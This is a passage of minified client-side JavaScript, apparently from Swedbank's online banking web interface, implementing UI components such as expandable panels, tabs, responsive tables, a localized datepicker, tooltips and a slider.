blink.id!==blinkId}))},doBlinkCallback=function(blink){if(blink.onBlink)try{blink.onBlink()}catch(err){console.error("Blinker: Exception calling onBlinkCallback:",err.message)}};return{start:function(blinkId,title,hasHighPriority,onBlinkCallback){clearInterval(notificationInterval),removeBlink(blinkId),function(blink){var index;for(index=0;index<queue.length&&!(blink.priority<=queue[index].priority);index++);queue.splice(index,0,blink)}({id:blinkId,title:title,onBlink:onBlinkCallback,priority:hasHighPriority?0:10}),null===originalTitle&&(originalTitle=document.title);var showOriginalTitle=!1;notificationInterval=setInterval((function(){document.title=showOriginalTitle?originalTitle:queue[0].title,showOriginalTitle=!showOriginalTitle,queue.forEach(doBlinkCallback)}),1e3)},stop:function(blinkId){removeBlink(blinkId),0===queue.length&&(clearInterval(notificationInterval),null!==originalTitle&&(document.title=originalTitle,originalTitle=null))}}}(),function($){$((function(){$(".curtain.-open").trigger("curtain-open",{slideDuration:500});var hash=Swedbank.Navigation.getHash();hash&&$('#content a[data-curtain-id="'+hash+'"]').trigger("curtain-open"),$(".curContentDefault:has(.validation-message, .errorMsg)").prev().find("a").trigger("curtain-open"),$(".curtain-body:has(.validation-message, .errorMsg)").prev().find("a").trigger("curtain-open")})),Swedbank.PageLoad.onFirst((function($){$("body").setDefault("click",".curtains .-expandable .curtain-head",(function(e){"A"==$(e.target).prop("tagName")?$(e.target).attr("href"):$(e.target).parents("a").attr("href");if("A"!=$(e.target).prop("tagName")||$(e.target).hasClass("curtain-expander")){var $curtain=$(this),targetEvent=$curtain.parent().is(".-open")?"curtain-close":"curtain-open";$curtain.trigger(targetEvent)}})).on("curtain-open curtain-close",".curtains .-expandable .curtain-head",(function(event,options){var $anchor=$(this),$content=$anchor.next(),$curtainsList=$anchor.closest(".curtains"),attr=$anchor.attr("data-show-accounts");(options=$.extend({slideDuration:300,autoClose:!1},$curtainsList.data(),options),"curtain-open"==event.type?($content.slideDown(options.slideDuration,(function(){if($anchor.trigger("curtain-opened"),"mobile"===Swedbank.Helpers.getMediumPlatform())if(0===$anchor.parents(".modal-body").length)$anchor.scrollTo("slow",-60);else{$anchor.parentsUntil(".modal-body").each((function(){("relative"===$(this).css("position")||this.classList.contains("curtain"))&&this.offsetTop})),SharedComponents.helpers.scrollTo($anchor.parents(".modal-body")[0],5)}})),$anchor.find("a").attr("aria-expanded",!0),$content.attr("aria-hidden",null),$content.focus()):($content.slideUp(options.slideDuration,(function(){$anchor.trigger("curtain-closed")})),$anchor.find("a").removeAttr("aria-expanded"),$content.attr("aria-hidden",!0)),"true"===attr&&window.showAccounts(!1),"false"===attr&&window.showAccounts(!0),"curtain-open"===event.type&&options.autoClose)&&(void 0!==options.autoCloseContainer?$("#"+options.autoCloseContainer):$curtainsList).find(".curtain.-expandable.-open .curtain-head").not(this).trigger("curtain-close");$anchor.parent().toggleClass("-open","curtain-open"===event.type),$anchor.parent()[0].dispatchEvent(new CustomEvent("curtain-open"===event.type?"open":"close"))})).on("curtain-disable curtain-enable",".curtains .curtain-head",(function(event,options){var $content=$(this).next();"curtain-disable"==event.type&&$content.addClass("-disabled"),"curtain-enable"==event.type&&$content.removeClass("-disabled")}))}))}(jQuery),function($){function toggleTabs(){var MAX_CONTENT_WIDTH=$("#content").width();$("#mainForm").find(".tabs-wrapper ul.tabsList").each((function(){var $tabList=$(this),$tabListChildren=$tabList.children(),$tabs=$tabListChildren.filter(":visible"),$lastHiddenTab=$tabListChildren.eq($tabs.length-1),$lastVisibleTab=$tabs.not(".tab-selection").last(),$tabContainer=$tabList.prev(".tab-container"),tabsTotalWidth=$tabs.calculateTotalWidth();if($tabList.parents(".frame").length||$tabList.parent().hasClass("-vertical")&&Swedbank.Viewport.isMobile())$tabListChildren.removeAttr("style");else{if($tabList.parents(".tabsContent").length&&(MAX_CONTENT_WIDTH=$tabList.parent().width()),tabsTotalWidth>MAX_CONTENT_WIDTH&&0!==MAX_CONTENT_WIDTH){if($tabList.hasClass("tabs-wide-format")){var $tabContainerElement=$tabContainer.find("[data-tab-index='"+$lastVisibleTab.index()+"']");$tabContainerElement.show(),$lastVisibleTab.hide(),$lastVisibleTab.find("a").hasClass("active")&&($tabList.find(".tab-selection > a").addClass("active"),$tabContainerElement.addClass("active"))}else $tabList.addClass("tabs-wide-format");toggleTabs()}MAX_CONTENT_WIDTH-tabsTotalWidth>$lastHiddenTab.width()&&($tabContainer.find("[data-tab-index='"+($lastVisibleTab.index()+1)+"']").hide(),$lastHiddenTab.show(),$lastHiddenTab.find("a").hasClass("active")&&$tabList.find(".tab-selection > a").removeClass("active"));var $tabListHeight=$tabList.height(),tabContainerOffsetTop=parseInt($tabContainer.css("top")),tabContainerMarginTop=parseInt($tabContainer.css("margin-top"));$tabListHeight!==tabContainerOffsetTop+tabContainerMarginTop&&($tabContainer.css("top",$tabListHeight),tabContainerMarginTop>0&&$tabContainer.css("margin-top",0))}}))}Swedbank.PageLoad.onFirst((function($){$("body").on("click",'ul.tabsList a[href="#"]',(function(e){e.preventDefault();var $tab=$(this),$list=$tab.closest("ul.tabsList"),tabIndex=$list.find("a").index($tab),$content=$list.next(".tabsContent").children().eq(tabIndex);$content.length&&"private.investor.deposits.my.interests"!=Swedbank.Navigation.pageId&&($list.find(".active").removeClass("active"),$tab.addClass("active"),$content.show().attr("aria-hidden","false"),$content.siblings().hide().attr("aria-hidden","true")),toggleTabs()})),$(window).resize((function(){setTimeout((function(){toggleTabs()}),300)}))})),$((function(){$(".tabsContent").each((function(){var $wrapper=$(this),$contentDivs=$wrapper.children("div");$contentDivs.length==$contentDivs.filter(":empty").length&&$wrapper.remove()}));var hash=Swedbank.Navigation.getHash(),matches=hash&&hash.match(/tab=([\w\-]+)/),tabId=matches&&matches[1],tabElem=$("#"+tabId);tabElem.length>0&&-1===tabElem[0].nodeName.indexOf("UI-")&&($('#content .tabsList a[id="'+tabId+'"]').trigger("click"),tabElem.scrollTo(200)),$("#mainForm .tabsList").each((function(){var $list=$(this),$tabSelection=$('<li class="tab-selection"/>'),$tabContainer=$('<div class="tab-container"/>').hide(),$icon=$('<a><span class="ico ellipsis"/></a>');$list.parent().hasClass("-vertical")||($list.children().each((function(tabIndex){var $tab=$(this);$("<div>",{html:$tab.find("a").html()}).attr("data-tab-index",tabIndex).untilUnload("click",(function(){var selectedTabIndex=$(this).data("tab-index");$list.find("a").get(selectedTabIndex).click(),$icon.addClass("active"),$tabContainer.find("div").removeClass("active"),$tabContainer.find("[data-tab-index='"+tabIndex+"']").addClass("active"),$tabContainer.hide()})).appendTo($tabContainer).hide()})),$tabSelection.untilUnload("click",(function(){$list.find("a.active").toggleClass("active"),$tabSelection.find("a").toggleClass("active"),$tabContainer.toggle()})),$list.untilUnload("click","a",(function(){var tabIndex=$list.find("a").index(this);$(this).parent().hasClass("tab-selection")||$tabContainer.find("div").removeClass("active"),$tabSelection.val(tabIndex)})),$icon.appendTo($tabSelection),$tabContainer.insertBefore($list),$tabSelection.appendTo($list),$("body").untilUnload("click",(function(event){$tabSelection.is(event.target)||$tabSelection.children().is(event.target)||$tabContainer.hide()})))})),toggleTabs()}))}(jQuery),function(window,$){function responsiveTables($table){this.$table=$table;var cssTables=["-mobile-merge-columns","-mobile-fits"];this.$table.find("thead .-hide-small").length>0&&this.hideColumns(this.$table);for(var i=0;i<cssTables.length;i++)if(this.$table.hasClass(cssTables[i]))return;this.$table.hasClass("-mobile-invert")?(this.$table.hasClass("-scrollable")&&(this.addAdditionalHorizontalScroll(this.$table),this.addResizeListener(this.$table)),this.transformHeaderToDataAttributes(this.$table)):this.$table.hasClass("-mobile-first-col-expandable")?this.transformToExpandable(this.$table):this.$table.hasClass("-mobile-comparison")?(this.fitTableColumns(this.$table),this.transformComparison(this.$table)):this.fitTableColumns(this.$table)}responsiveTables.prototype={transformToExpandable:function($table){var $row=$table.find("tr");$row.children(":first-child").addClass("js-row-trigger -mobile-trigger"),$row.find(".js-row-trigger").on("click",(function(){var $this=$(this);Swedbank.Viewport.isMobile()&&($this.hasClass("-open")||$this.scrollTo("slow",-70),$this.toggleClass("-open"),$this.siblings().toggleClass("-expanded"))}))},fitWithArrows:function($table){this.helpers.addWrapper($table);var interval,$btn=$table.closest(".responsive-table-container").find(".scroll-table-btn");$btn.on("touchstart",(function(e){var $wrapper=$(this).siblings("div"),$self=$(this);interval=setInterval((function(){var offset=$wrapper.scrollLeft();$self.hasClass("-right")?$wrapper.scrollLeft(offset+1):$wrapper.scrollLeft(offset-1)}),1)})),$btn.on("touchend",(function(e){clearInterval(interval)}));var setNav=this.setNavigationPosition;$(window).untilUnload("scroll resize",(function(){setNav($table)}))},shouldShrinkColumns:function($table){return!!$table.hasClass("-shrink-columns")||!!$table.hasClass("-mobile-comparison")&&this.helpers.getComparisonTableColumnCount($table)-1<=this.helpers.getMaxColumnsToBeShrink()},fitTableColumns:function($table){this.shouldShrinkColumns($table)?this.$table.addClass("-shrink-columns"):this.fitWithArrows($table)},transformHeaderToDataAttributes:function($table){var $header_rows=$table.find("thead tr");switch(this.helpers.removeColAndRowSpan(this.$table.find("tr > *")),$header_rows.length){case 0:$table.hasClass("-no-class-remove")||($table.removeClass("-mobile-invert"),this.fitWithArrows($table));break;case 1:this.addSingleAttribute($table,$header_rows,"data-th");break;default:this.addMultipleAttributes($table)}this.helpers.addColAndRowSpan(this.$table.find("tr > *"))},transformComparison:function($table){var $rows=$table.find("tbody tr"),$expandRow=$table.find(".row-expand").children(),cols=[],isMobile=Swedbank.Viewport.isMobile(),desktopColSpan=$expandRow.attr("colspan"),mobileColSpan=desktopColSpan-1,$window=$(window);if($rows.each((function(){var $this=$(this);$this.hasClass("row-expand")?$this.find(":first-child").wrapInner('<div class="fixed-title"/>'):(cols.push($this.children().length-1),$this.children(":first").is(":empty")||$this.before('<tr class="fixed-row"><td colspan="'+Math.max.apply(null,cols)+'"><div class="fixed-title">'+$this.find(":first-child").html()+"</div></td></tr>"))})),isMobile){$expandRow.attr("colspan",mobileColSpan);var $clone=$table.clone();$clone.find("tbody, tfoot").remove(),$table.closest(".responsive-table-container").append($clone),$clone.wrap('<div class="fixed-table-clone-container"><div class="responsive-table-wrapper"/></div></div>');$window.untilUnload("scroll",(function(){var elTop=$table.offset().top,elBottom=elTop+$table.outerHeight(),scrollTop=$window.scrollTop(),tableHeadHeight=$table.find("thead").outerHeight();scrollTop>=elTop&&scrollTop<=elBottom-tableHeadHeight&&$table.is(":visible")?$table.parent().siblings(".fixed-table-clone-container").addClass("-visible"):$table.parents(".responsive-table-container").find(".fixed-table-clone-container").removeClass("-visible")})),$table.parent().on("scroll",(function(){$clone.parent().animate({scrollLeft:$(this).scrollLeft()},10)}))}function setAbsoluteRowHeight(){$(".fixed-row, .row-expand").each((function(){var $this=$(this),$fixedTitle=$this.find(".fixed-title");if($this.is(":hidden")){var $clone=$fixedTitle.clone().appendTo("body");$clone.css({position:"absolute",visibility:"hidden",display:"block",padding:"10px 0"}),$this.css("height",$clone.outerHeight()),$clone.remove()}else $this.css("height",$fixedTitle.outerHeight())}))}$(document).ready((function(){setAbsoluteRowHeight()})),$window.untilUnload("resize",(function(){setAbsoluteRowHeight();var isMobileNow=Swedbank.Viewport.isMobile();isMobile!==isMobileNow&&($expandRow.attr("colspan",desktopColSpan),(isMobile=isMobileNow)&&$expandRow.attr("colspan",mobileColSpan))}))},addSingleAttribute:function($table,$header_row,$attr_name){var $body_cells=$table.find("tr").children(),$header_cells=$header_row.children();$body_cells.each((function(){var $header_cell_text=$header_cells.eq($(this).index()).text();$header_cell_text&&$(this).attr($attr_name,$header_cell_text)}))},addMultipleAttributes:function($table){var self=this;$table.find("thead tr").each((function(i){self.addSingleAttribute($table,$(this),"data-th-"+i)}))},addAdditionalHorizontalScroll:function($table){$table.parent().width()<$table.width()&&$(window).width()>767?(this.fitWithArrows($table),$table.closest(".responsive-table-container").find(".scroll-table-btn").show()):this.helpers.removeWrapper($table)},addResizeListener:function($table){var self=this;$(window).untilUnload("resize",(function(){self.addAdditionalHorizontalScroll($table)}))},setNavigationPosition:function($table){var $nav=$table.closest(".responsive-table-container").find(".scroll-table-btn"),navMargin=-(Swedbank.Viewport.width-$table.parent().width())/2;if($nav.filter(":not(.-left)").css("right",navMargin),$nav.filter(":not(.-right)").css("left",navMargin),$table.height()>Swedbank.Viewport.height){var scrollTop=$(this).scrollTop(),scrollBot=scrollTop+Swedbank.Viewport.height,elTop=$table.offset().top,elBottom=elTop+$table.outerHeight(),visibleHeight=(elBottom>scrollBot?scrollBot:elBottom)-(elTop<scrollTop?scrollTop:elTop),navPos=visibleHeight/2,isTopVisible=!(elTop<scrollTop),isBottomVisible=!(elBottom>scrollBot);$nav.addClass("-dynamic"),visibleHeight>10&&isTopVisible&&!isBottomVisible?$nav.css({top:navPos,bottom:"auto"}):visibleHeight!==Swedbank.Viewport.height||isTopVisible||isBottomVisible?visibleHeight>10&&!isTopVisible&&isBottomVisible&&$nav.css({top:"auto",bottom:navPos}):$nav.css({top:scrollTop-elTop+navPos,bottom:"auto"})}},hideColumns:function($table){$table.find("thead .-hide-small").each((function(){$table.find("tr td:nth-child("+($(this).index()+1)+")").addClass("-hide-small")}))},helpers:{addWrapper:function($table){$table.hasClass("-js-init")||($table.parent().hasClass("container")?$table.parent().addClass("responsive-table-container"):$table.wrap('<div class="responsive-table-container"/>'),$table.addClass("-js-init"),$table.wrap('<div class="responsive-table-wrapper"/>'),$table.closest(".responsive-table-container").append('<span class="scroll-table-btn -left"></span><span class="scroll-table-btn -right"></span>'))},removeWrapper:function($table){$table.hasClass("-js-init")&&($table.removeClass("-js-init"),$table.closest(".responsive-table-container").find(".scroll-table-btn").remove(),$table.unwrap().unwrap())},removeColSpan:function($elements){$elements.each((function(){var $this=$(this);if($this.attr("colspan")){var $colspan_value=$this.attr("colspan"),tagName=$this.prop("tagName");for(i=1;i<$colspan_value;i++)$this.after("<"+tagName+' class="colspan-filler"></'+tagName+">");$this.removeAttr("colspan")}}))},addColSpan:function($elements){$elements.not(".colspan-filler").each((function(){var $this=$(this),$colspan_fillers=$this.nextUntil(':not(".colspan-filler")'),$colspan_filler_length=$colspan_fillers.length;$colspan_filler_length>0&&($this.attr("colspan",$colspan_filler_length+1),$colspan_fillers.remove())}))},removeRowSpan:function($elements){$elements.each((function(){var $this=$(this);if($this.attr("rowspan")){$this.addClass("rowspan-cell");var $index=$this.index(),$rowspan_value=$this.attr("rowspan");$this.parent().nextAll("tr").slice(0,$rowspan_value-1).children().each((function(){var $row_element=$(this);$row_element.index()==$index&&$row_element.before("<td></td>").parent().addClass("rowspan-filler-row")})),$this.removeAttr("rowspan")}}))},addRowSpan:function($elements){$elements.filter(".rowspan-cell").each((function(){var $this=$(this),$filler_rows=$this.parent().nextUntil(':not(".rowspan-filler-row")');$this.attr("rowspan",$filler_rows.length+1).removeClass("rowspan-cell"),$filler_rows.each((function(){$(this).removeClass("rowspan-filler-row").children().eq($this.index()).remove()}))}))},getComparisonTableColumnCount:function($table){return $table.find("thead tr").first().find("th").size()},getMaxColumnsToBeShrink:function(){return 2},removeColAndRowSpan:function($elements){this.removeColSpan($elements),this.removeRowSpan($elements)},addColAndRowSpan:function($elements){this.addColSpan($elements),this.addRowSpan($elements)}}},responsiveTables.loadCallback=()=>{$(".default-table, .comparison-table").each((function(){new responsiveTables($(this))}))},Swedbank.responsiveTables=responsiveTables||{},Swedbank.isUiSpaEnabled?(SharedComponents.eventBus.addEventListener("spa-navigation-complete",responsiveTables.loadCallback),UI.whenDOMReady(responsiveTables.loadCallback)):Swedbank.PageLoad.onEach(responsiveTables.loadCallback)}(window,jQuery),function($){var defaultOptions={showOn:"button",buttonText:"",firstDay:1,changeYear:!0,selectOtherMonths:!0,showOtherMonths:!0,changeMonth:!0,showButtonPanel:!0,yearRange:"1900:c+30",dateFormat:"dd.mm.yy",onClose:function(val,ui){$(this).next().focus()}},localization={EST:{dayNamesMin:["P","E","T","K","N","R","L"],prevText:"Eelmine kuu",nextText:"Järgmine kuu",currentText:"Tänane kuupäev",closeText:"Sulge",timeText:"Aeg",hourText:"Tund",minuteText:"Minut",secondText:"Sekund"},RUS:{dayNamesMin:["вс","пн","вт","ср","чт","пт","сб"],prevText:"Месяц назад",nextText:"Месяц вперед",currentText:"Сегодня",closeText:"Закрыть",timeText:"Время",hourText:"Часы",minuteText:"Минуты",secondText:"Секунды"},LAT:{dayNamesMin:["Sv","Pr","Ot","Tr","Ce","Pk","Se"],prevText:"Iepr. mēnesis",nextText:"Nākošais mēnesis",currentText:"Šodien",closeText:"Aizvērt",timeText:"Laiks",hourText:"Stunda",minuteText:"Minūte",secondText:"Sekunde"},LIT:{dayNamesMin:["Sek","Pir","Ant","Tre","Ket","Pen","Šeš"],prevText:"Ankstesnis mėnuo (laikykite, jei norite meniu)",nextText:"Kitas mėnuo (laikykite, jei norite meniu)",currentText:"Pasirinkti šiandieną",closeText:"Uždaryti",timeText:"Laikas",hourText:"Valanda",minuteText:"Мinutė",secondText:"Sekundė"}};function isSelector(value){return"string"==typeof value&&value.startsWith("#")}function getOptionsFromFieldElement($field){var options=$.extend({},defaultOptions),data=$field.data();return["minDate","maxDate","timeFormat"].forEach((function(property){var value=data[property];value&&!isSelector(value)&&(options[property]=function interpretDateValue(value){return"today"===value?new Date:"number"==typeof value?new Date(value):value}(value))})),options.gotoCurrent=data.enableToday,options}function interpretDateRangeValue(value){var date;if(value instanceof Date)date=moment(value).startOf("day");else if("string"==typeof value)if(10===value.length)date=moment(value,moment.defaultFormat);else if(value.startsWith("-")||value.startsWith("+")){var amount=value.match(/\d+/)[0],unit=value.split("").last();"m"===unit&&(unit="M"),date=value.startsWith("-")?moment().startOf("day").subtract(amount,unit):moment().startOf("day").add(amount,unit)}return date}function showErrorMessage($field,message){var $container=$field.closest("dd");$container.addClass("validation-error"),$("<div>",{class:"validation-message",text:message}).appendTo($container)}function hideErrorMessage($field){var $container=$field.closest("dd");$container.removeClass("validation-error"),$container.find(".validation-message").remove()}function toggleReadOnly($field){Swedbank.Viewport.isMobile()&&"readonly"!==$field.attr("readonly")?$field.attr("readonly","readonly"):Swedbank.Viewport.isMobile()||$field.removeAttr("readonly")}function fillTimeFromDataAttributes($timefield){$timefield.data("currentTime")?$timefield.val($timefield.data("currentTime")):$timefield.data("defaultTime")&&$timefield.val($timefield.data("defaultTime"))}$.fn.addDatepicker=function(){return this.each((function(){var originalValue=this.value,$field=$(this),data=$field.data(),options=getOptionsFromFieldElement($field);["minDate","maxDate"].forEach((function(property){data[property]&&isSelector(data[property])&&function connectDateFieldsBySelector($sourceField,targetSelector,dateType){var $connectedDateField=$(targetSelector);$connectedDateField.on("change",(function(){var date=$connectedDateField.val();$sourceField.datepicker("option",dateType,date)}))}($field,data[property],property)})),$field.isInside(".modal-window")||(options.beforeShow=function(field,datepicker){setTimeout((function(){datepicker.dpDiv.css("z-index",4).attr({"aria-label":Swedbank.Labels("date"),"aria-region":Swedbank.Labels("date"),role:"complementary"}),datepicker.dpDiv.find("a.ui-state-active").attr("tabindex",0).focus(),datepicker.dpDiv.find(".ui-datepicker-prev,.ui-datepicker-prev").attr({role:"button",href:"javascript:void(0)"})}),0)}),toggleReadOnly($field);$(window).untilUnload("resize",(function(){toggleReadOnly($field)})),$field.on("change",(function(){options=getOptionsFromFieldElement($field);var errorLabel,dateFormat=moment.defaultFormat,minDate=options.minDate,maxDate=options.maxDate,selectedDate=moment($field.val(),dateFormat);hideErrorMessage($field),options.minDate&&(minDate=interpretDateRangeValue(options.minDate))&&selectedDate.isBefore(minDate)&&(errorLabel=Swedbank.Labels("dateFieldValueOutOfMinRange").supplementWith({from:minDate.format(dateFormat)}),showErrorMessage($field,errorLabel)),options.maxDate&&((maxDate=interpretDateRangeValue(options.maxDate))&&selectedDate.isAfter(maxDate)?(errorLabel=Swedbank.Labels("dateFieldValueOutOfMaxRange").supplementWith({before:maxDate.add(1,"day").format(dateFormat)}),showErrorMessage($field,errorLabel)):hideErrorMessage($field))})),options.timeFormat?$field.datetimepicker(options):($field.datepicker(options),$field.isInside(".period-selection-component")&&setTimeout((function(){$field.val()!==originalValue&&$field.val(originalValue)}))),data.calendarIconId&&$field.next("button").attr("id",data.calendarIconId)}))},Swedbank.PageLoad.onFirst((function(){"LT"===Swedbank.country&&(defaultOptions.dateFormat="yy-mm-dd"),"ENG"!==Swedbank.language&&$.extend(defaultOptions,localization[Swedbank.language],{dayNames:Swedbank.Time.labels.days,monthNames:Swedbank.Time.labels.months,monthNamesShort:Swedbank.Time.labels.months}),$("body").on("click",".datepicker-time-field + .ico.time",(function(){var $timefield=$(this).prev().toggleClass("visible");$timefield.is(".visible")?fillTimeFromDataAttributes($timefield):$timefield.val("")}))})),$((function(){$(".datepicker-time-field").each((function(){($(this).attr("data-rule-required")||$(this).attr("data-current-time"))&&fillTimeFromDataAttributes($(this).addClass("visible"))}))}))}(jQuery),Swedbank.isUiSpaEnabled?(SharedComponents.eventBus.addEventListener("spa-navigation-complete",Swedbank.Forms.enhanceDateFields),UI.whenDOMReady(Swedbank.Forms.enhanceDateFields)):Swedbank.PageLoad.onEach(Swedbank.Forms.enhanceDateFields),function($){var $lastClicked=null;window.Tooltip=function(target,content,options){if(this.$target=$(target),this.$target.length)return this.options=$.extend({closeOnBackgroundClick:!0},options),this.$target.data("tooltip")?$.extend(this,this.$target.data("tooltip")):(this.render(),this.$target.data("tooltip",this)),this.open(),content&&this.setContent(content),this;Swedbank.log('Tooltip: No match found for selector "'+this.$target.selector+'".')},Tooltip.prototype.render=function(){var tooltip=this;return this.$=$('<div class="tooltip-container tooltip-loading" aria-hidden="true"/>').appendTo("body"),this.$content=$('<div class="tooltip-content"/>').appendTo(this.$),this.options.closeOnBackgroundClick&&$("body").untilUnload("click",(function(event){!tooltip.$.find(event.target).length&&!tooltip.$.is(event.target)&&!tooltip.$target.is(event.target)&&!tooltip.justOpened&&tooltip.close()})),$("body").hasClass("april-fools-day")&&tooltip.$content.html('<img src="/img/icons/mchammer.gif"/>'),this.$.on("keydown",(function(event){27!==event.keyCode&&27!==event.which||tooltip.close(),9!==event.keyCode&&9!==event.which||$lastClicked.focus()})),this.$.on("focusout",(function(event){$lastClicked.focus()})),this.repositionAfterViewportResize(),this},Tooltip.prototype.renderPointer=function(){return this.$pointer=$('<div class="tooltip-pointer">').prependTo(this.$),this},Tooltip.prototype.renderOverlay=function(){return this.$overlay=$('<div class="tooltip-overlay">').prependTo(this.$),this.$overlay.on("click",function(){this.close()}.bind(this)),this},Tooltip.prototype.getPointerDimensions=function(){var dimensions={width:20,height:10,position:{}};return dimensions.position.left=20,dimensions.position.right=20,dimensions},Tooltip.prototype.position=function(){var pointer=this.getPointerDimensions(),$offsetTop=this.$target.offset().top+this.$target.outerHeight()+pointer.height;if(Swedbank.Viewport.isMobile()){var scrollPosition=$("html").scrollTop()||$("body").scrollTop();$offsetTop=($(window).height()-this.$.height())/2+scrollPosition}return this.$.css({top:$offsetTop}),this.$target.offset().left>$(window).width()/2?this.$.addClass("tooltip-right").removeClass("tooltip-left").css({right:$(window).width()-(this.$target.offset().left+(this.$target.hasClass("caption-right")?this.$target.outerWidth():pointer.width))-pointer.position.left-1}):this.$.addClass("tooltip-left").removeClass("tooltip-right").css({left:this.$target.offset().left-pointer.position.left+(this.$target.hasClass("caption-right")?this.$target.outerWidth()-pointer.width:0)}),this},Tooltip.prototype.repositionAfterViewportResize=function(){var tooltip=this;$(window).untilUnload("resize",(function(){clearTimeout(undefined),Swedbank.Viewport.isMobile()||$(".tooltip-close",this.$,this.$overlay).hide(),tooltip.position()}))},Tooltip.prototype.setContent=function(content){var tooltip=this;function setContent(content){tooltip.$content.html(content)}return this.$.removeClass("tooltip-loading"),$("body").hasClass("april-fools-day")?tooltip.$content.find("img").delay(2e3).fadeOut("slow",(function(){setContent(content)})):setContent(content),$(".tooltip-close",this.$).length||$('<div class="tooltip-close">').on("click",(function(){tooltip.close()})).prependTo(this.$),Swedbank.Viewport.isMobile()?$(".tooltip-close",this.$).show():$(".tooltip-close",this.$).hide(),$(".tooltip-content a").on("click",(function(){tooltip.close()})),this},Tooltip.prototype.calculateZIndex=function(){this.$.css("z-index",this.$target.getZIndex()+1)},Tooltip.prototype.open=function(){var tooltip=this;return Tooltip.instance=tooltip,this.$pointer||this.renderPointer(),this.$overlay||this.renderOverlay(),this.$target.length?(this.$overlay.show(),this.$.show(),this.$.removeAttr("aria-hidden"),this.$target.addClass("help-action-open"),this.position(),this.$.attr("tabindex",0),this.$target.is("#mainForm *")||this.$target.is(".yui-panel-container *")||this.$target.is(".modal-window *")||this.calculateZIndex(),tooltip.justOpened=!0,setTimeout((function(){tooltip.justOpened=!1}),300),this):(Swedbank.error("Tooltip target doesn't exist, looked for selector: ",this.$target.selector),this)},Tooltip.prototype.close=function(){return this.$overlay.fadeOut("fast"),this.$.fadeOut("fast"),this.$.attr("aria-hidden","true"),this.$target.removeClass("help-action-open"),this.$.removeAttr("tabindex"),this.$.removeClass("-open"),this},Swedbank.PageLoad.onFirst((function(){$("body").on("click","[data-help-id], [data-help-text]",(function(event){$lastClicked=$(this);var $help=$(this),isOpen=$help.is(".help-action-open"),content=Swedbank.Helpers.removeScripts($help.attr("data-help-text")),helpId=$help.data("helpId"),tooltip=new Tooltip($help);if(($help.is("a")||$help.is("span.help-action"))&&event.preventDefault(),isOpen)return tooltip.close(),!1;if($help.next().hasClass("content-tooltip")&&(content=$help.next().clone().attr("aria-hidden","false")),content)tooltip.setContent(content),tooltip.position(),tooltip.$.focus(),tooltip.$.addClass("-open");else if(helpId){tooltip.$.attr("aria-busy",!0);var params=$.extend(getSessionParams(),{pageId:"help.smallhelp",labelId:helpId,helpId:Swedbank.Navigation.pageId});$.post(document.mainForm.action,params,(function(data){tooltip.setContent(data),tooltip.$.attr("aria-busy",!1),tooltip.$.focus(),tooltip.$.addClass("-open")}))}})),$("body").on("keypress","[data-help-id], [data-help-text]",(function(event){13!==event.which&&13!=event.keyCode&&32!=event.which&&32!=event.keyCode||(event.preventDefault(),$(this).trigger("click"))}))}))}(jQuery),Slider.defaultOptions={min:0,max:100,lim:null,limLabel:"",limLabelSize:"",initialValue:null,step:1,range:"min",valueSuffix:"",currentValueHidden:!1,rangeMarkers:!0,fixedValues:[],displayInput:"no",rangeMarkerFormatter:function(type){var marker=this.options[type];return this.options.valueSuffix&&(marker+=" "+this.options.valueSuffix),marker},valueMarkerFormatter:function(value){return this.options.valueSuffix&&(value+=" "+this.options.valueSuffix),value}},Slider.prototype.renderContainer=function(){this.$element.wrap('<div class="slider-container">'),this.$container=this.$element.parent(),this.$container.attr("data-current-value-hidden",this.options.currentValueHidden),"yes"===this.options.displayInput&&this.$container.addClass("-display-input")},Slider.prototype.initialize=function(){var slider=this;this.options.create=function(){slider.renderValueMarker()},this.options.slide=function(event,ui){void 0!==ui&&(ui.values?slider.options.values=ui.values:slider.options.fixedValues.length>1?slider.options.value=slider.options.fixedValues[ui.value]:slider.options.value=ui.value),slider.refreshValueMarker(),slider.callbacks.slide.forEach((function(callback){callback(slider.getCurrentValue())}))},this.options.stop=function(){slider.callbacks.slidechange.forEach((function(callback){callback(slider.getCurrentValue())}))},this.$element.slider(this.options);var $slider=this.$element;this.$element.on({sliderrefresh:function(){slider.options.fixedValues.length>0?slider.createRangeMarkers(slider.options.fixedValues[0],slider.options.fixedValues[length-1]):slider.createRangeMarkers($slider.slider("option","min"),$slider.slider("option","max")),slider.updateValueMarker(!0===slider.options.range?$slider.slider("option","values"):$slider.slider("option","value")),$slider.slider("option","lim")!=slider.options.lim&&(slider.options.lim=$slider.slider("option","lim"),slider.createAdditionalLimit()),slider.options.lim&&$slider.slider("option","lim-label")!=slider.options.limLabel&&(slider.options.limLabel=$slider.slider("option","lim-label"),slider.createAdditionalLimitLabel())},slidermarkervalueupdate:function(event,value,addSuffix){slider.updateValueMarker(value,addSuffix)}})},Slider.prototype.setMinValue=function(min){this.options.min=min,this.$element.slider("option","min",min),this.refreshRangeMarkers(),this.getCurrentValue()<min&&this.setCurrentValue(min)},Slider.prototype.setMaxValue=function(max){this.options.max=max,this.$element.slider("option","max",max),this.refreshRangeMarkers(),this.getCurrentValue()>max&&this.setCurrentValue(max)},Slider.prototype.setCurrentValue=function(values){Array.isArray(values)?(this.$element.slider("option","values",values),this.options.values=values):(this.$element.slider("option","value",values),this.options.value=values),this.refreshValueMarker()},Slider.prototype.getCurrentValue=function(){return this.options.values||this.options.value},Slider.prototype.renderValueMarker=function(){this.$element.find(".ui-slider-handle").append('<div class="current-value-container">  <div class="current-value"></div></div>'),this.refreshValueMarker()},Slider.prototype.renderRangeMarkers=function(){this.$container.append('<div class="slider-range-point"></div><div class="slider-range-point"></div>'),this.refreshRangeMarkers()},Slider.prototype.createAdditionalLimit=function(){var left,that=this;left="yes"===this.options.displayInput?(this.options.lim-this.options.min)/(this.options.max-this.options.min)*65:(this.options.lim-this.options.min)/(this.options.max-this.options.min)*100,this.$element.parent().find(".slider-additional-limit").remove(),("yes"===this.options.displayInput&&left<65||"yes"!=this.options.displayInput&&left<100)&&(this.$element.parent().append('<div class="slider-additional-limit"></div>'),this.$element.parent().find(".slider-additional-limit").css("left",left+"%").untilUnload("click",(function(){that.setCurrentValue(that.options.lim)})))},Slider.prototype.createAdditionalLimitLabel=function(){if(this.$element.parent().find(".slider-additional-limit-label").remove(),this.$element.parent().find(".slider-additional-limit").append('<div class="slider-additional-limit-label"><div></div></div>'),this.$element.parent().find(".slider-additional-limit-label div").html(this.options.limLabel),this.$container.addClass("-additional-limit"),""!=this.options.limLabelSize){var 